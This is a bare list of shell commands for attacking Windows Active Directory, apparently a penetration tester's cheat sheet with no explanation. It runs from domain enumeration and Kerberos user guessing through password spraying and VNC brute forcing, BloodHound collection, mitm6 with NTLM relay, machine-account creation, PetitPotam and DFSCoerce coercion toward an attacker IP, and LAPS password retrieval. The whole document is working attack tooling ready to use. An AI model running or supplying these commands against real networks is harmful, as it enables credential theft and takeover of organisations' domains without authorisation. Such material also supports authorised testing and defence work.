nslookup -type=SRV _ldap._tcp.dc._msdcs."$DOMAIN"
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV +short
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=users.txt" $DC
kerbrute userenum --domain "$DOMAIN" users.txt
ldapsearch-ad.py --server "$DC" --type info
nxc ldap $DC -u "$USER" -p "$PASSWORD" --bloodhound --collection All
enum4linux-ng -A "$DC"
nxc smb $DC -u '' -p '' --users | tee raw_users.txt
cat raw_users.txt | awk '{print $5}' | tee users.txt
LDAPWordlistHarvester.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC"
nmap -p 5800,5900 --open --script=vnc-brute -iL computers.txt
nmap -sC -p 445 -iL computers.txt -oA ms17 -vv --script smb-vuln-ms17-010.nse 
nxc ldap "$DC" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M obsolete | tee obsolete_computers
cat obsolete_computers | awk '{print $5}' | tee obsolete_computers
nxc smb obsolete_computers
ldapsearch -x -H ldap://$DC -D "DOMAIN"'\'"$USER" -w "$PASSWORD" -b "DC=DOMAIN,DC=LOCAL" | tee enroled_computers_raw.txt
nmap -sn -iL enroled_computers_raw.txt -v | tee alive_enroled_computers_nmap.txt # Ping Scan 
cat alive_enroled_computers_nmap.txt | grep "Nmap scan report for" | awk {'print $6'} | tr -d '()' | awk '!seen[$0]++'| tee computers.txt
nxc smb $DC -u users_parsed_list.txt -p users_parsed_list.txt --no-bruteforce --continue-on-success
nxc smb computers.txt --gen-relay-list
adidnsdump -u $DOMAIN\\$USER -p $PASSWORD ldap://$DC -r
adidnsdump -u $DOMAIN\\$USER -p $PASSWORD ldap://$DC --zone $DOMAIN -r --legacy
cat records.csv | cut -d ',' -f2 | grep -v -e 'value' -e '?' | tee dns-all.txt
adidnsdump -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --print-zones "$DC"
mitm6 -d example.local -i $INTERFACE
FindUncommonShares.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC" --check-user-access | tee uncommon_smb_shares.txt
ntlmrelayx.py -6 -t ldaps://$DC1 -wh fakewpad.example.local -l loot
nxc smb computers.txt -u $USER -p $PASSWORD --shares --filter-shares READ WRITE | grep -v -e "NETLOGON" -e "IPC$"
nxc ldap $DC -u $USER -p $PASSWORD -M pso
bloodhound.py --zip -c All -u $USER -p $PASSWORD -ns $DC -d $DOMAIN
bloodhound-ce.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -ns "$DC"
cme smb $DC -u "$USER" -p "$PASSWORD" --pass-pol
nxc smb $DC -u users_parsed_list.txt -p users_parsed_list.txt --no-bruteforce --continue-on-success
nmap -PR -sn 192.168.130.0/24 -vv # ARP Scan 
nmap -p 5800,5900 --open --script=vnc-brute -iL computers.txt
nxc ldap $DC -u $USER -p $PASSWORD -M maq
addcomputer.py -computer-name 'pentest_computer$' -computer-pass 'ComputerPassW0rd' -dc-host "$DC1" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
nxc ldap $DC -u $USER -p $PASSWORD -M subnets
petitpotam.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC"
dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC"
pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC"